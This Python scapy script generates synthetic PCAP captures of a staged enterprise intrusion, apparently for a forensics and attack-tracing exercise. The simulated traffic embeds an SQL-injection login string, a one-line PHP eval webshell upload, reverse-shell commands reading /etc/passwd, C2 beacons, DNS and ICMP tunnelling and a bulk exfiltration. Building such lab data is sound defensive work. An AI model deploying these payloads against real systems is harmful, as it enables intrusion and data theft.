"""生成 Case01「企业内网攻击行为溯源」样例 PCAP + hosts 映射表（成员C）。

模拟一次完整攻击链（时间基准 2026-09-07 09:00:00）：

  阶段0  正常背景流量     办公机 DNS/HTTP/邮件/小ping
  阶段1  侦察            攻击者 203.0.113.66 对 web-server 端口扫描（18端口）
  阶段2  初始访问        攻击者对 web 发送 SQL注入 / Webshell 上传请求
  阶段3  建立据点        web-server 反弹 Shell 连接攻击者 4444 端口
  阶段4  横向移动        web -> office-pc-01(445/3389) -> core-server(22)
  阶段5  命令与控制      core-server 每 60s 向 C2:8443 定期心跳 ×6
  阶段6  隐蔽信道        core-server DNS 隧道（高熵长子域名 TXT 查询 ×8）
  阶段7  数据外传        core-server 向外部 HTTP 上传 1.2MB 数据
  阶段8  隐蔽信道        core-server ICMP 大载荷隧道 + 办公机正常小 ping 对照
  阶段9  正常背景流量    攻击后业务恢复

用法：
    python scripts/gen_sample_pcap.py \
        --out data/network_logs/case01_enterprise_attack.pcap --hosts data/hosts.csv
"""
import argparse
import base64
import os
import random
from datetime import datetime

from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, wrpcap

# ---------------------------------------------------------------- 拓扑（与E的8节点靶场对齐，IP 可按靶场实际调整）
ATTACKER = "203.0.113.66"      # 攻击节点（外网）
WEB = "10.0.0.5"               # web服务器（DMZ）
MAIL = "10.0.0.8"              # email服务器（DMZ）
CORE = "10.0.0.10"             # 核心服务器（服务器区）
OFFICE1 = "10.0.0.21"          # 办公计算机1
OFFICE2 = "10.0.0.22"          # 办公计算机2
GW_DNS = "10.0.0.1"            # 防火墙/网关 DNS（交换机不产生三层流量）
C2 = "185.199.108.153"         # C2服务器（外网）
EXFIL = "45.33.32.156"         # 数据外传目标（外网）
PUB_WEB = "93.184.216.34"      # 正常外部网站
PUB_UPDATE = "23.63.98.210"    # 正常补丁服务器
PUB_DNS = "8.8.8.8"            # 外部DNS

HOSTS_CSV = """ip,hostname,role
10.0.0.1,gateway-dns,infrastructure
10.0.0.5,web-server,dmz
10.0.0.8,mail-server,dmz
10.0.0.10,core-server,server-zone
10.0.0.21,office-pc-01,office
10.0.0.22,office-pc-02,office
203.0.113.66,attacker-external,external
185.199.108.153,c2-server,external
45.33.32.156,exfil-server,external
93.184.216.34,pub-web-01,external
23.63.98.210,update-server,external
8.8.8.8,google-dns,external
"""

BASE = datetime(2026, 9, 7, 9, 0, 0).timestamp()

# Case02 额外节点（第二个攻击者与第二个 C2）
HOSTS_CSV_CASE02_EXTRA = """198.51.100.23,attacker2-external,external
45.61.136.207,c2-server-2,external
"""


class Builder:
    def __init__(self, shift: float = 0.0):
        self.pkts = []
        random.seed(42)
        self.shift = shift     # case02：不同攻击链用不同 shift 实现时间交错

    def add(self, offset: float, pkt):
        pkt.time = BASE + offset + self.shift
        self.pkts.append(pkt)


class TCPSession:
    """带最小序号管理的 TCP 会话构造器（client=发起方）。"""

    def __init__(self, b: Builder, client: str, server: str, sport: int, dport: int):
        self.b = b
        self.c, self.s = client, server
        self.sport, self.dport = sport, dport
        self.cs = random.randint(0x10000, 0xFFFFF)   # client seq（下一待发）
        self.ss = random.randint(0x10000, 0xFFFFF)   # server seq

    def _c(self, ts, flags, payload=b""):
        pkt = IP(src=self.c, dst=self.s) / TCP(sport=self.sport, dport=self.dport,
                                               flags=flags, seq=self.cs, ack=self.ss)
        if payload:
            pkt = pkt / Raw(load=payload)
        self.b.add(ts, pkt)
        self.cs += len(payload) + (1 if flags in ("S", "FA", "F") else 0)

    def _s(self, ts, flags, payload=b""):
        pkt = IP(src=self.s, dst=self.c) / TCP(sport=self.dport, dport=self.sport,
                                               flags=flags, seq=self.ss, ack=self.cs)
        if payload:
            pkt = pkt / Raw(load=payload)
        self.b.add(ts, pkt)
        self.ss += len(payload) + (1 if flags in ("SA", "FA", "F") else 0)

    def handshake(self, ts):
        self._c(ts, "S")
        self._s(ts + 0.01, "SA")
        self._c(ts + 0.02, "A")

    def send(self, ts, from_client: bool, payload: bytes):
        if from_client:
            self._c(ts, "PA" if payload else "A", payload)
        else:
            self._s(ts, "PA" if payload else "A", payload)

    def close(self, ts):
        self._c(ts, "FA")
        self._s(ts + 0.01, "FA")
        self._c(ts + 0.02, "A")

    def rst_client(self, ts):
        self._c(ts, "R")

    def rst_server(self, ts):
        self._s(ts, "R")


def raw_syn(b: Builder, ts, src, dst, sport, dport):
    b.add(ts, IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="S", seq=random.randint(0x10000, 0xFFFFF), ack=0))


def raw_synack(b: Builder, ts, src, dst, sport, dport):
    b.add(ts, IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="SA", seq=random.randint(0x10000, 0xFFFFF), ack=random.randint(0x10000, 0xFFFFF)))


def raw_rstack(b: Builder, ts, src, dst, sport, dport):
    b.add(ts, IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="RA", seq=random.randint(0x10000, 0xFFFFF), ack=random.randint(0x10000, 0xFFFFF)))


def dns_exchange(b: Builder, ts, client, resolver, qname, qtype="A", answer=None):
    sport = random.randint(30000, 60000)
    qid = random.randint(1, 65000)
    b.add(ts, IP(src=client, dst=resolver) / UDP(sport=sport, dport=53) /
          DNS(id=qid, rd=1, qd=DNSQR(qname=qname, qtype=qtype)))
    if answer:
        b.add(ts + 0.02, IP(src=resolver, dst=client) / UDP(sport=53, dport=sport) /
              DNS(id=qid, qr=1, qd=DNSQR(qname=qname, qtype=qtype),
                  an=DNSRR(rrname=qname, ttl=300, rdata=answer)))


def ping(b: Builder, ts, src, dst, ident, seq, payload=b"", reply=True):
    b.add(ts, IP(src=src, dst=dst) / ICMP(type=8, id=ident, seq=seq) / Raw(load=payload))
    if reply:
        b.add(ts + 0.01, IP(src=dst, dst=src) / ICMP(type=0, id=ident, seq=seq) / Raw(load=payload))


def next_sport():
    return random.randint(30000, 60000)


# ---------------------------------------------------------------- 攻击链各阶段

def phase0_background(b: Builder):
    """正常办公流量（DNS / HTTP / 邮件 / 小ping）。"""
    benign_dns = [
        (6, OFFICE1, "www.baidu.com", "142.250.196.4"),
        (17, OFFICE2, "www.qq.com", "111.30.131.31"),
        (23, OFFICE1, "cdn.jsdelivr.net", "104.16.88.20"),
        (41, OFFICE1, "mail.company.local", "10.0.0.8"),
        (55, WEB, "update.microsoft.com", PUB_UPDATE),
        (66, OFFICE2, "ntp.aliyun.com", "203.107.6.88"),
        (79, CORE, "intranet.portal.local", "10.0.0.30"),
        (92, OFFICE2, "gitlab.company.local", "10.0.0.40"),
    ]
    for ts, client, name, ip in benign_dns:
        dns_exchange(b, ts, client, GW_DNS, name, "A", answer=ip)

    # 办公机浏览网页
    s = TCPSession(b, OFFICE1, PUB_WEB, next_sport(), 80)
    s.handshake(10)
    s.send(10.05, True, b"GET /index.html HTTP/1.1\r\nHost: 93.184.216.34\r\nUser-Agent: Mozilla/5.0 Chrome/126\r\n\r\n")
    s.send(10.15, False, b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 5120\r\n\r\n<html>...</html>")
    s.close(11.0)

    s = TCPSession(b, OFFICE2, PUB_WEB, next_sport(), 80)
    s.handshake(48)
    s.send(48.05, True, b"GET /news.html HTTP/1.1\r\nHost: 93.184.216.34\r\nUser-Agent: Mozilla/5.0 Edge/126\r\n\r\n")
    s.send(48.2, False, b"HTTP/1.1 200 OK\r\nContent-Length: 2048\r\n\r\n<html>news</html>")
    s.close(49.0)

    # web 服务器拉取补丁（正常运维）
    s = TCPSession(b, WEB, PUB_UPDATE, next_sport(), 80)
    s.handshake(70)
    s.send(70.05, True, b"GET /windowsupdate/manifest.xml HTTP/1.1\r\nHost: update.microsoft.com\r\nUser-Agent: Windows-Update-Agent\r\n\r\n")
    s.send(70.4, False, b"HTTP/1.1 200 OK\r\nContent-Length: 8192\r\n\r\n<manifest/>")
    s.close(71.2)

    # 邮件客户端收信（IMAP）与发信（SMTP）
    s = TCPSession(b, OFFICE1, MAIL, next_sport(), 143)
    s.handshake(30)
    s.send(30.1, True, b"a1 LOGIN alice StrongPass2026\r\n")
    s.send(30.2, False, b"a1 OK LOGIN completed\r\n")
    s.send(30.5, True, b"a2 SELECT INBOX\r\n")
    s.send(30.6, False, b"* 42 EXISTS\r\na2 OK\r\n")
    s.close(36.0)

    s = TCPSession(b, OFFICE2, MAIL, next_sport(), 25)
    s.handshake(44)
    s.send(44.1, False, b"220 mail.company.local ESMTP ready\r\n")
    s.send(44.3, True, b"EHLO office-pc-02\r\n")
    s.send(44.4, False, b"250 mail.company.local\r\n")
    s.send(45.0, True, b"MAIL FROM:<bob@company.local>\r\n")
    s.send(45.1, False, b"250 OK\r\n")
    s.close(47.0)

    # 办公机小 ping（正常，载荷 32 字节）
    for i, ts in enumerate([62, 64, 66]):
        ping(b, ts, OFFICE2, PUB_DNS, 0x1000 + i, i + 1, payload=b"abcdefghijklmnopqrstuvwabcdefghiv")


def phase1_port_scan(b: Builder):
    """攻击者 half-open 端口扫描：18 个端口，80/8443 开放（SYN-ACK），其余 RST 拒绝。"""
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 5900, 8080, 8443, 9000]
    ts = 100.0
    for p in ports:
        sport = next_sport()
        raw_syn(b, ts, ATTACKER, WEB, sport, p)
        if p in (80, 8443):
            raw_synack(b, ts + 0.02, WEB, ATTACKER, p, sport)
            # half-open 扫描：收到 SYN-ACK 后立即 RST 中断
            b.add(ts + 0.04, IP(src=ATTACKER, dst=WEB) /
                  TCP(sport=sport, dport=p, flags="R", seq=random.randint(0x10000, 0xFFFFF), ack=0))
        else:
            raw_rstack(b, ts + 0.02, WEB, ATTACKER, p, sport)
        ts += 0.3


def phase2_web_attack(b: Builder):
    """SQL 注入探测 + Webshell 上传（两次 HTTP 会话）。"""
    s = TCPSession(b, ATTACKER, WEB, next_sport(), 80)
    s.handshake(128)
    s.send(128.1, True, b"GET /login.php HTTP/1.1\r\nHost: web-server\r\nUser-Agent: sqlmap/1.8\r\n\r\n")
    s.send(128.2, False, b"HTTP/1.1 200 OK\r\nContent-Length: 1420\r\n\r\n<form>login</form>")
    s.send(129.0, True,
           b"POST /login.php HTTP/1.1\r\nHost: web-server\r\nUser-Agent: sqlmap/1.8\r\n"
           b"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 44\r\n\r\n"
           b"username=admin'--&passwd=x' OR '1'='1")
    s.send(129.3, False, b"HTTP/1.1 302 Found\r\nLocation: /admin/\r\n\r\n")
    s.close(130.0)

    s = TCPSession(b, ATTACKER, WEB, next_sport(), 80)
    s.handshake(133)
    s.send(133.1, True, b"GET /admin/config.php HTTP/1.1\r\nHost: web-server\r\nUser-Agent: Mozilla/5.0\r\n\r\n")
    s.send(133.2, False, b"HTTP/1.1 403 Forbidden\r\n\r\n")
    shell = b"-----------------------------7d0\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n<?php eval($_POST['cmd']); ?>\r\n-----------------------------7d0--\r\n"
    s.send(134.5, True,
           b"POST /upload.php HTTP/1.1\r\nHost: web-server\r\nUser-Agent: Mozilla/5.0\r\n"
           b"Content-Type: multipart/form-data; boundary=---------------------------7d0\r\n"
           b"Content-Length: " + str(len(shell)).encode() + b"\r\n\r\n" + shell)
    s.send(134.9, False, b"HTTP/1.1 200 OK\r\nContent-Length: 29\r\n\r\n/upload/shell.php saved ok")
    s.close(136.0)


def phase3_reverse_shell(b: Builder):
    """web-server 反弹 Shell 到攻击者 4444 端口。"""
    s = TCPSession(b, WEB, ATTACKER, next_sport(), 4444)
    s.handshake(150)
    s.send(150.2, True, b"Linux web-server 5.4.0-169-generic x86_64\n")
    s.send(150.5, False, b"whoami\n")
    s.send(150.8, True, b"www-data\n")
    s.send(151.2, False, b"cat /etc/passwd; sudo -l\n")
    s.send(151.6, True, b"root:x:0:0:root:/root:/bin/bash\nUser www-data may run sudo\n")
    s.rst_client(154.0)


def phase4_lateral_movement(b: Builder):
    """web -> office(445/3389) -> core(22)。"""
    s = TCPSession(b, WEB, OFFICE1, next_sport(), 445)
    s.handshake(200)
    s.send(200.2, True, b"\x00\x00\x00\x54\xffSMB" + os.urandom(80))
    s.send(200.5, False, b"\x00\x00\x00\x48\xffSMB" + os.urandom(66))
    s.send(201.0, True, b"\x00\x00\x04\x00\xffSMBNTLMSSP\x01" + os.urandom(40))
    s.close(202.0)

    s = TCPSession(b, WEB, OFFICE1, next_sport(), 3389)
    s.handshake(203)
    s.rst_server(203.4)

    s = TCPSession(b, OFFICE1, CORE, next_sport(), 22)
    s.handshake(230)
    s.send(230.2, True, b"SSH-2.0-OpenSSH_8.9p1\r\n")
    s.send(230.4, False, b"SSH-2.0-OpenSSH_8.2p1\r\n")
    s.send(230.8, True, os.urandom(180))     # 密钥交换
    s.send(231.0, False, os.urandom(340))
    s.send(232.0, True, os.urandom(120))     # 认证请求
    s.send(232.3, False, b"\x0c success\r\n")
    s.close(234.0)


def phase5_c2_beacon(b: Builder):
    """core-server 每 60s 向 C2:8443 心跳 ×6（时间规律、载荷小）。"""
    for i in range(6):
        ts = 260 + i * 60.0
        s = TCPSession(b, CORE, C2, next_sport(), 8443)
        s.handshake(ts)
        s.send(ts + 0.15, True, b"BEACON-" + f"{i:02d}-".encode() + os.urandom(16).hex().encode())
        s.send(ts + 0.3, False, b"OK-" + os.urandom(8).hex().encode())
        s.close(ts + 0.5)


def phase6_dns_tunnel(b: Builder):
    """core-server DNS 隧道：随机高熵长子域名 TXT 查询 ×8。"""
    for i in range(8):
        label = base64.b32encode(os.urandom(25)).decode().lower().rstrip("=")
        dns_exchange(b, 300 + i * 10.0, CORE, GW_DNS, f"{label}.t.c2bad-dns.com", "TXT")
    # 兜底：再补 2 条 A 记录探测（不触发熵规则）
    dns_exchange(b, 375.0, CORE, GW_DNS, "beacon.t.c2bad-dns.com", "A")


def phase7_exfiltration(b: Builder):
    """core-server 向外部 HTTP 上传 1.2MB 数据（数据外传）。"""
    total = 1_200_000
    data = os.urandom(total)
    seg = 1400
    s = TCPSession(b, CORE, EXFIL, next_sport(), 80)
    s.handshake(400)
    first = (b"POST /api/upload HTTP/1.1\r\nHost: 45.33.32.156\r\n"
             b"User-Agent: curl/8.5.0\r\n"
             b"Content-Type: application/octet-stream\r\n"
             b"Content-Length: " + str(total).encode() + b"\r\n\r\n" + data[:seg])
    s.send(400.3, True, first)
    sent = seg
    ts = 400.35
    while sent < total:
        s.send(ts, True, data[sent:sent + seg])
        sent += seg
        ts += 0.03
    s.send(ts + 0.5, False, b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK")
    s.close(ts + 1.0)


def phase8_icmp_tunnel(b: Builder):
    """core-server ICMP 大载荷隧道（512B×5）+ 攻击后正常业务。"""
    for i in range(5):
        ping(b, 450 + i * 2.0, CORE, PUB_DNS, 0x0539, i + 1, payload=os.urandom(512))


CRLF = bytes((13, 10))       # 传输层会折叠反斜杠，源码中避免出现转义文本
SMB_HDR = bytes((0, 0, 0, 0x54, 0xFF)) + b"SMB"
SSH_BANNER_C = b"SSH-2.0-OpenSSH_8.9p1" + CRLF
SSH_BANNER_S = b"SSH-2.0-OpenSSH_8.2p1" + CRLF
SSH_OK = bytes((12,)) + b" success" + CRLF


def phase_attacker1_bruteforce_chain(b: Builder):
    """攻击者2: 198.51.100.23 对 mail-server 走 SSH 爆破链（case02 专用）。

    19 次 RST 拒绝 + 1 次成功登录 -> 触发网络侧 brute_force_evidence（T1110），
    随后横向到 core-server，回连第二个 C2:4445。
    """
    ATT2 = "198.51.100.23"
    for i in range(19):
        sport = next_sport()
        raw_syn(b, 700 + i * 8.0, ATT2, MAIL, sport, 22)
        raw_rstack(b, 700 + i * 8.0 + 0.05, MAIL, ATT2, 22, sport)
    s = TCPSession(b, ATT2, MAIL, next_sport(), 22)      # 第 20 次成功登录
    s.handshake(860)
    s.send(860.3, True, SSH_BANNER_C)
    s.send(860.5, False, SSH_BANNER_S)
    s.send(861.0, True, os.urandom(120))
    s.send(861.3, False, SSH_OK)
    s.close(864.0)
    s = TCPSession(b, MAIL, CORE, next_sport(), 445)     # 横向: mail -> core
    s.handshake(870)
    s.send(870.2, True, SMB_HDR + os.urandom(80))
    s.close(872.0)
    C2B = "45.61.136.207"                                # 第二个 C2 端点
    for i in range(5):
        ts = 880 + i * 45.0
        s = TCPSession(b, CORE, C2B, next_sport(), 4445)
        s.handshake(ts)
        s.send(ts + 0.15, True, b"PING-" + os.urandom(12).hex().encode())
        s.send(ts + 0.3, False, b"OK")
        s.close(ts + 0.5)


def phase9_aftermath(b: Builder):
    """攻击结束后业务流量恢复（对照数据）。"""
    benign = [
        (620, OFFICE1, "www.baidu.com", "142.250.196.4"),
        (633, OFFICE2, "oa.company.local", "10.0.0.50"),
        (647, CORE, "backup.company.local", "10.0.0.60"),
    ]
    for ts, client, name, ip in benign:
        dns_exchange(b, ts, client, GW_DNS, name, "A", answer=ip)
    s = TCPSession(b, OFFICE2, MAIL, next_sport(), 143)
    s.handshake(660)
    s.send(660.1, True, b"a1 LOGIN bob StrongPass2027\r\n")
    s.send(660.2, False, b"a1 OK LOGIN completed\r\n")
    s.close(662.0)
    for i, ts in enumerate([670, 672]):
        ping(b, ts, OFFICE2, PUB_DNS, 0x2000 + i, i + 1, payload=b"abcdefghijklmnopqrstuvwabcdefghiv")


def main():
    parser = argparse.ArgumentParser(description="生成企业内网攻击链样例 PCAP（Case01/Case02）")
    parser.add_argument("--case02", action="store_true",
                        help="生成 Case02 双攻击链样例（两个攻击者独立成链，含 SSH 爆破）")
    parser.add_argument("--out", default=None)
    parser.add_argument("--hosts", default=None)
    args = parser.parse_args()

    if args.case02:
        out = args.out or "data/network_logs/case02_dual_attack.pcap"
        hosts = args.hosts or "data/hosts_case02.csv"
        hosts_content = HOSTS_CSV + HOSTS_CSV_CASE02_EXTRA
    else:
        out = args.out or "data/network_logs/case01_enterprise_attack.pcap"
        hosts = args.hosts or "data/hosts.csv"
        hosts_content = HOSTS_CSV

    b = Builder()
    phase0_background(b)
    if args.case02:
        b.shift = 4 * 3600                    # 攻击者1（SSH爆破链）：13:00 时段
        phase_attacker1_bruteforce_chain(b)
        b.shift = 5 * 3600                    # 攻击者2（Web链）：14:00 时段，时间交错
        phase1_port_scan(b)
        phase2_web_attack(b)
        phase3_reverse_shell(b)
        phase4_lateral_movement(b)
        phase5_c2_beacon(b)
        phase6_dns_tunnel(b)
    else:
        phase1_port_scan(b)
        phase2_web_attack(b)
        phase3_reverse_shell(b)
        phase4_lateral_movement(b)
        phase5_c2_beacon(b)
        phase6_dns_tunnel(b)
        phase7_exfiltration(b)
        phase8_icmp_tunnel(b)
        phase9_aftermath(b)

    os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
    wrpcap(out, b.pkts)
    if hosts:
        os.makedirs(os.path.dirname(os.path.abspath(hosts)), exist_ok=True)
        with open(hosts, "w", encoding="utf-8") as fh:
            fh.write(hosts_content)

    span = b.pkts[-1].time - b.pkts[0].time
    print(f"已生成 {out}: {len(b.pkts)} 个数据包，时间跨度 {span:.0f} 秒")
    print(f"已生成 {hosts}（IP-主机名映射，与靶场拓扑对齐，可按实际环境修改）")
    if args.case02:
        print("Case02 预埋: 攻击者1 SSH爆破(mail:22)->横向->C2:4445；"
              "攻击者2 完整Web链(扫描/注入/反弹Shell/C2/DNS隧道)")
    else:
        print("预埋攻击行为: 端口扫描 / SQL注入 / Webshell上传 / 反弹Shell(4444) / "
              "横向移动(445,3389,22) / C2心跳(60s) / DNS隧道 / 1.2MB数据外传 / ICMP大载荷隧道")


if __name__ == "__main__":
    main()
